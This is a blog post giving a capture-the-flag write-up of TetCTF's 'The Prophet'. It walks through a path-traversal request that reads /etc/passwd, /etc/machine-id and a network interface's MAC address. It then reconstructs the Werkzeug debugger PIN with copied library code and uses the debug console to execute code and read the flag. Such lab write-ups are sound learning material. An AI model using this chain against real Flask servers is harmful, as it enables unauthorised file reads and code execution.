<!DOCTYPE html>
<html>

  <head>
    <meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">

<link rel="stylesheet" href="/css/main.css">

<!-- Custom stylesheets -->


    <!-- Begin Jekyll SEO tag v2.7.1 -->
<title>The Prophet - TetCTF | Cheuk‚Äôs Blog</title>
<meta name="generator" content="Jekyll v4.2.1" />
<meta property="og:title" content="The Prophet - TetCTF" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="This was a fun one. We start off with a web page and get a foothold with an arbitrary file read vulnerability, and end it off with a Python Flask Arbitrary Code Execution in the web debugger." />
<meta property="og:description" content="This was a fun one. We start off with a web page and get a foothold with an arbitrary file read vulnerability, and end it off with a Python Flask Arbitrary Code Execution in the web debugger." />
<meta property="og:site_name" content="Cheuk‚Äôs Blog" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2020-01-08T07:12:00-08:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="The Prophet - TetCTF" />
<script type="application/ld+json">
{"headline":"The Prophet - TetCTF","dateModified":"2020-01-08T07:12:00-08:00","datePublished":"2020-01-08T07:12:00-08:00","mainEntityOfPage":{"@type":"WebPage","@id":"/writeup/2020/01/08/the-prophet-tetctf.html"},"description":"This was a fun one. We start off with a web page and get a foothold with an arbitrary file read vulnerability, and end it off with a Python Flask Arbitrary Code Execution in the web debugger.","@type":"BlogPosting","url":"/writeup/2020/01/08/the-prophet-tetctf.html","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->


    
  <head>

  <body>
    <div class="wrapper">
      <nav>
  <a href="/" class="nav-title">
    Cheuk's Blog
  </a>

  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  <a class="nav-links" href="/resources/">Resources</a>
  
  
  
  
  
  
  
  
  
  
  
  
  
  <a class="nav-links" href="/about/">About</a>
  
  
</nav>

      
      <article class="post">
  <h1 class="title">The Prophet - TetCTF</h1>
  <span>
    <span>
    Tags:
    
    <a href="/tag/ctf">
      ctf
    </a>
    
    <a href="/tag/writeup">
      writeup
    </a>
    
    <a href="/tag/python">
      python
    </a>
    
    <a href="/tag/flask">
      flask
    </a>
    
    <a href="/tag/ace">
      ACE
    </a>
    
    </span>
    <span class="meta">08 Jan 2020</span>
  </span>

  <p>This was a fun one. We start off with a web page and get a foothold with an
arbitrary file read vulnerability, and end it off with a Python Flask Arbitrary
Code Execution in the web debugger.</p>

<p>On the webpage, we are presented with a hyperlink with the text <code class="language-plaintext highlighter-rouge">Read some
oracle here</code>. Clicking the hyperlink brings us to 5 web pages
<code class="language-plaintext highlighter-rouge">/read/oracle/[1-5].txt</code>. One of them, <code class="language-plaintext highlighter-rouge">1.txt</code>, says the following:</p>

<blockquote>
  <p>Flag is in random folder at /, but what is it name? Who know ü§∑‚Äç‚ôÇÔ∏è 
Can you help me? (This is not brute/guess challenge‚Ä¶) !</p>
</blockquote>

<p>We try to see if we can get to other files by changing the URL to something
else (try <code class="language-plaintext highlighter-rouge">0.txt</code>), and we get a Flask debugger error page. In it, we see the
directory the app lives in, <code class="language-plaintext highlighter-rouge">/home/web3_user/app.py</code>. Let‚Äôs see what would
happen if we change the URL to that. We set the URL to <code class="language-plaintext highlighter-rouge">/read/app.py</code>. We get
the following Python code:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span>
<span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">render_template</span>
<span class="kn">import</span> <span class="nn">random</span>

<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>

<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
	<span class="n">rand</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">5</span><span class="p">))</span>
	<span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'index.html'</span><span class="p">,</span> <span class="n">random</span><span class="o">=</span><span class="n">rand</span><span class="p">)</span>

<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/read/&lt;path:filename&gt;'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">read</span><span class="p">(</span><span class="n">filename</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
	<span class="n">rand</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">5</span><span class="p">))</span>

	<span class="k">try</span><span class="p">:</span>
		<span class="n">content</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s">'r'</span><span class="p">).</span><span class="n">read</span><span class="p">()</span>
	<span class="k">except</span><span class="p">:</span>
		<span class="k">raise</span>
	<span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'file.html'</span><span class="p">,</span> <span class="n">filename</span><span class="o">=</span><span class="n">content</span><span class="p">,</span> <span class="n">random</span><span class="o">=</span><span class="n">rand</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
	<span class="n">app</span><span class="p">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s">'0.0.0.0'</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="s">'7004'</span><span class="p">,</span> <span class="n">debug</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
</code></pre></div></div>

<p>To read files with directory traversal, substitute your <code class="language-plaintext highlighter-rouge">/</code> with the URL
encoded equivalent <code class="language-plaintext highlighter-rouge">%2f</code>. Reading <code class="language-plaintext highlighter-rouge">/etc/passwd</code> would just be a get request to
<code class="language-plaintext highlighter-rouge">/read/..%2f..%2fetc%2fpasswd</code> (remember that we are in <code class="language-plaintext highlighter-rouge">/home/web3_user/</code>).</p>

<p>As you can see, debug mode is on. This means that whenever an error occurs, an
interactive console can be toggled and let you input code (a.k.a. Flask
debugger page mentioned above). The caveat is that it is secured with a PIN
that is only displayed in the <code class="language-plaintext highlighter-rouge">stdout</code> when you run the server. This PIN is not
generated randomly every time; rather, it uses a bunch of different
machine-specific pieces of information to generate a PIN. This is the
<a href="https://github.com/pallets/werkzeug/blob/71cf9902012338f8ee98338fa7bba50572606637/src/werkzeug/debug/__init__.py#L133">function</a> for generating a PIN. I have taken the liberty to remove
the part that checks the environment for a pin.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">get_pin_and_cookie_name</span><span class="p">(</span><span class="n">app</span><span class="p">):</span>
    <span class="s">"""Given an application object this returns a semi-stable 9 digit pin
    code and a random key.  The hope is that this is stable between
    restarts to not make debugging particularly frustrating.  If the pin
    was forcefully disabled this returns `None`.
    Second item in the resulting tuple is the cookie name for remembering.
    """</span>
    <span class="n">rv</span> <span class="o">=</span> <span class="bp">None</span>
    <span class="n">num</span> <span class="o">=</span> <span class="bp">None</span>

    <span class="n">modname</span> <span class="o">=</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">app</span><span class="p">,</span> <span class="s">"__module__"</span><span class="p">,</span> <span class="n">app</span><span class="p">.</span><span class="n">__class__</span><span class="p">.</span><span class="n">__module__</span><span class="p">)</span>

    <span class="k">try</span><span class="p">:</span>
        <span class="c1"># getuser imports the pwd module, which does not exist in Google
</span>        <span class="c1"># App Engine. It may also raise a KeyError if the UID does not
</span>        <span class="c1"># have a username, such as in Docker.
</span>        <span class="n">username</span> <span class="o">=</span> <span class="n">getpass</span><span class="p">.</span><span class="n">getuser</span><span class="p">()</span>
    <span class="k">except</span> <span class="p">(</span><span class="nb">ImportError</span><span class="p">,</span> <span class="nb">KeyError</span><span class="p">):</span>
        <span class="n">username</span> <span class="o">=</span> <span class="bp">None</span>

    <span class="n">mod</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">modules</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">modname</span><span class="p">)</span>

    <span class="c1"># This information only exists to make the cookie unique on the
</span>    <span class="c1"># computer, not as a security feature.
</span>    <span class="n">probably_public_bits</span> <span class="o">=</span> <span class="p">[</span>
        <span class="n">username</span><span class="p">,</span>
        <span class="n">modname</span><span class="p">,</span>
        <span class="nb">getattr</span><span class="p">(</span><span class="n">app</span><span class="p">,</span> <span class="s">"__name__"</span><span class="p">,</span> <span class="n">app</span><span class="p">.</span><span class="n">__class__</span><span class="p">.</span><span class="n">__name__</span><span class="p">),</span>
        <span class="nb">getattr</span><span class="p">(</span><span class="n">mod</span><span class="p">,</span> <span class="s">"__file__"</span><span class="p">,</span> <span class="bp">None</span><span class="p">),</span>
    <span class="p">]</span>

    <span class="c1"># This information is here to make it harder for an attacker to
</span>    <span class="c1"># guess the cookie name.  They are unlikely to be contained anywhere
</span>    <span class="c1"># within the unauthenticated debug page.
</span>    <span class="n">private_bits</span> <span class="o">=</span> <span class="p">[</span><span class="nb">str</span><span class="p">(</span><span class="n">uuid</span><span class="p">.</span><span class="n">getnode</span><span class="p">()),</span> <span class="n">get_machine_id</span><span class="p">()]</span>

    <span class="n">h</span> <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">md5</span><span class="p">()</span>
    <span class="k">for</span> <span class="n">bit</span> <span class="ow">in</span> <span class="n">chain</span><span class="p">(</span><span class="n">probably_public_bits</span><span class="p">,</span> <span class="n">private_bits</span><span class="p">):</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">bit</span><span class="p">:</span>
            <span class="k">continue</span>
        <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">bit</span><span class="p">,</span> <span class="n">text_type</span><span class="p">):</span>
            <span class="n">bit</span> <span class="o">=</span> <span class="n">bit</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">"utf-8"</span><span class="p">)</span>
        <span class="n">h</span><span class="p">.</span><span class="n">update</span><span class="p">(</span><span class="n">bit</span><span class="p">)</span>
    <span class="n">h</span><span class="p">.</span><span class="n">update</span><span class="p">(</span><span class="sa">b</span><span class="s">"cookiesalt"</span><span class="p">)</span>

    <span class="n">cookie_name</span> <span class="o">=</span> <span class="s">"__wzd"</span> <span class="o">+</span> <span class="n">h</span><span class="p">.</span><span class="n">hexdigest</span><span class="p">()[:</span><span class="mi">20</span><span class="p">]</span>

    <span class="c1"># If we need to generate a pin we salt it a bit more so that we don't
</span>    <span class="c1"># end up with the same value and generate out 9 digits
</span>    <span class="k">if</span> <span class="n">num</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
        <span class="n">h</span><span class="p">.</span><span class="n">update</span><span class="p">(</span><span class="sa">b</span><span class="s">"pinsalt"</span><span class="p">)</span>
        <span class="n">num</span> <span class="o">=</span> <span class="p">(</span><span class="s">"%09d"</span> <span class="o">%</span> <span class="nb">int</span><span class="p">(</span><span class="n">h</span><span class="p">.</span><span class="n">hexdigest</span><span class="p">(),</span> <span class="mi">16</span><span class="p">))[:</span><span class="mi">9</span><span class="p">]</span>

    <span class="c1"># Format the pincode in groups of digits for easier remembering if
</span>    <span class="c1"># we don't have a result yet.
</span>    <span class="k">if</span> <span class="n">rv</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
        <span class="k">for</span> <span class="n">group_size</span> <span class="ow">in</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">3</span><span class="p">:</span>
            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">num</span><span class="p">)</span> <span class="o">%</span> <span class="n">group_size</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
                <span class="n">rv</span> <span class="o">=</span> <span class="s">"-"</span><span class="p">.</span><span class="n">join</span><span class="p">(</span>
                    <span class="n">num</span><span class="p">[</span><span class="n">x</span> <span class="p">:</span> <span class="n">x</span> <span class="o">+</span> <span class="n">group_size</span><span class="p">].</span><span class="n">rjust</span><span class="p">(</span><span class="n">group_size</span><span class="p">,</span> <span class="s">"0"</span><span class="p">)</span>
                    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">num</span><span class="p">),</span> <span class="n">group_size</span><span class="p">)</span>
                <span class="p">)</span>
                <span class="k">break</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">rv</span> <span class="o">=</span> <span class="n">num</span>

    <span class="k">return</span> <span class="n">rv</span><span class="p">,</span> <span class="n">cookie_name</span>
</code></pre></div></div>

<p>Fix the import errors:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">itertools</span> <span class="kn">import</span> <span class="n">chain</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">hashlib</span>
</code></pre></div></div>

<p>You might also notice that the variable <code class="language-plaintext highlighter-rouge">text_type</code> is not defined anywhere.
Digging a bit deeper in the <a href="https://github.com/pallets/werkzeug/blob/71cf9902012338f8ee98338fa7bba50572606637/src/werkzeug/_compat.py#L129">source code</a> gives us <code class="language-plaintext highlighter-rouge">text_type =
str</code> if we are using Python 3 (which we are).</p>

<p>There is another function that is referenced: <code class="language-plaintext highlighter-rouge">get_machine_id</code>, which gets the
machine‚Äôs ID, regardless of operating system. Using the exploit, we can read
the file <code class="language-plaintext highlighter-rouge">/etc/os-release</code> to see that we are on an Ubuntu system, so we check
the contents of <code class="language-plaintext highlighter-rouge">/etc/machine-id</code> and replace the function call with the string
<code class="language-plaintext highlighter-rouge">d4e6cb65d59544f3331ea0425dc555a1</code>.</p>

<p>We now need to know the username, modname, and whatever <code class="language-plaintext highlighter-rouge">uuid.getnode</code> returns.
The username is simple. We use the exploit to read <code class="language-plaintext highlighter-rouge">/etc/passwd</code> and see that
we are probably <code class="language-plaintext highlighter-rouge">web3_user</code>. If you call the function now and print the
<code class="language-plaintext highlighter-rouge">modname</code>, you see that it just says <code class="language-plaintext highlighter-rouge">flask.app</code>, so let‚Äôs assume that it‚Äôs the
same everywhere. This leaves <code class="language-plaintext highlighter-rouge">uuid.getnode</code>. We read the
<a href="https://docs.python.org/3/library/uuid.html#uuid.getnode">documentation</a> and see that it gets the hardware address (MAC
address) of the network interface. To do this, we first have to list out all
the current network interfaces by reading the file <code class="language-plaintext highlighter-rouge">/proc/net/dev</code>. We find the
ethernet interface <code class="language-plaintext highlighter-rouge">ens3</code> and read the file <code class="language-plaintext highlighter-rouge">/sys/class/net/ens3/address</code> to
get the hardware address <code class="language-plaintext highlighter-rouge">56:00:02:7a:23:ac</code>, and convert it into an integer,
and then to a string.</p>

<p>We are actually missing one thing. Within <code class="language-plaintext highlighter-rouge">get_pin_and_cookie_name</code> there is a
variable <code class="language-plaintext highlighter-rouge">probably_public_bits</code>. The last item may not be the same as the one
on the server, depending on the system you run python on. If we run the
function right now and print this variable, the last item would be something
similar to <code class="language-plaintext highlighter-rouge">/usr/*/python3.x/*-packages/flask/app.py</code>. If you would recall,
when we first ran into the error, it output
<code class="language-plaintext highlighter-rouge">/usr/local/lib/python3.5/dist-packages/flask/app.py</code>. So we simply replace the
call to <code class="language-plaintext highlighter-rouge">getattr</code> with the previous string, and call the function to get the
PIN. If it isn‚Äôt obvious already, the parameter you call it with is the
<code class="language-plaintext highlighter-rouge">app.py</code> code you got earlier.</p>

<p>After getting the PIN, we have access to the Werkzeug debugger/interactive
console, and thus have ACE. We execute the following code to find the flag:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="kn">import</span> <span class="nn">os</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">os</span><span class="p">.</span><span class="n">listdir</span><span class="p">(</span><span class="s">'/'</span><span class="p">)</span>
<span class="p">[</span><span class="s">'media'</span><span class="p">,</span> <span class="s">'tmp'</span><span class="p">,</span> <span class="s">'lib'</span><span class="p">,</span> <span class="s">'swapfile'</span><span class="p">,</span> <span class="s">'srv'</span><span class="p">,</span> <span class="s">'usr'</span><span class="p">,</span> <span class="s">'vmlinuz'</span><span class="p">,</span> <span class="s">'opt'</span><span class="p">,</span>
<span class="s">'initrd.img.old'</span><span class="p">,</span> <span class="s">'home'</span><span class="p">,</span> <span class="s">'bin'</span><span class="p">,</span> <span class="s">'boot'</span><span class="p">,</span> <span class="s">'etc'</span><span class="p">,</span> <span class="s">'lost+found'</span><span class="p">,</span> <span class="s">'initrd.img'</span><span class="p">,</span>
<span class="s">'root'</span><span class="p">,</span> <span class="s">'mnt'</span><span class="p">,</span> <span class="s">'vmlinuz.old'</span><span class="p">,</span> <span class="s">'dev'</span><span class="p">,</span> <span class="s">'phao_san_pa_lay___1337'</span><span class="p">,</span> <span class="s">'sys'</span><span class="p">,</span> <span class="s">'proc'</span><span class="p">,</span>
<span class="s">'run'</span><span class="p">,</span> <span class="s">'lib64'</span><span class="p">,</span> <span class="s">'sbin'</span><span class="p">,</span> <span class="s">'snap'</span><span class="p">,</span> <span class="s">'var'</span><span class="p">]</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">os</span><span class="p">.</span><span class="n">listdir</span><span class="p">(</span><span class="s">'/phao_san_pa_lay___1337'</span><span class="p">)</span>
<span class="p">[</span><span class="s">'flagggg.txt'</span><span class="p">]</span>
<span class="o">&gt;&gt;&gt;</span> <span class="nb">open</span><span class="p">(</span><span class="s">'/phao_san_pa_lay___1337/flagggg.txt'</span><span class="p">).</span><span class="n">read</span><span class="p">()</span>
<span class="s">"TetCTF{Flask_Debug_LFI___Wuttt__RCE}</span><span class="se">\n\n</span><span class="s">Please don't do any further action"</span> <span class="o">+</span>
<span class="s">"on the server, we knew the setup suck, but it's needed for the vulnerability</span><span class="se">\n</span><span class="s">"</span>
</code></pre></div></div>


</article>

<footer class="post-foot">
  <span class="prev">
  
    <span>Prev</span>
    <a href="/writeup/2019/12/31/where-go-infernoctf.html">Where did he GO? - Inferno CTF</a>
  
  </span>
  <span class="next">
  
    <span>Next</span>
    <a href="/gstreamer/2020/03/18/gstreamer-tricks.html">gstreamer tips and tricks</a>
  
  </span>
</footer>

    </div>
  </body>

</html>
